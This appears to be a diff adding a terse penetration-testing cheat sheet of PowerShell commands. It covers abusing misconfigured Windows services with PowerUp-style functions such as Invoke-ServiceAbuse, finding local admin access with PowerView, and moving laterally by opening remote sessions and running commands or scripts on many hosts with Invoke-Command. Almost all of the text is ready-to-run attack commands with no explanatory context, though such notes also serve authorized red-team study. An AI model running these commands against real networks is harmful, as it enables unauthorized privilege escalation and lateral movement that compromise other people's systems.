@@ -1,0 +1,26 @@
+Get-ServiceUnquoted
+
+Get-ModifiableServiceFile
+
+Get-ModifiableService
+
+Invoke-ServiceAbuse -Name "VulnerableSrvice" -UserName domain\user
+
+Invoke-AllChecks
+
+(FROM PowerView.ps1 - Find-LocalAdminAccess, and then - Find-PSRemotingLocalAdminAccess -ComputerName *output* to see if you can enter a PowerShell session on the
+outputted machine.)
+
+Enter-PSSession -ComputerName *ComputerName*
+
+$sess = New-PSSession -ComputerName *ComputerName*
+
+$sess (shows the open session)
+
+Enter-PSSession -Session $sess
+
+Invoke-Command -ComputerName *ComputerName* -ScriptBlock{whoami;hostname}
+
+Invoke-Command -ScriptBlock {command} -ComputerName (Get-Content *listOfServers.txt*) = Invoke-Command -ScriptBlock {Get-Process -IncludeUserName} -ComputerName *name* or (Get-Content list.txt)
+
+Invoke-Command -ComputerName *ComputerName* -FilePath *LocalFilePathTo.ps1/orAnything*
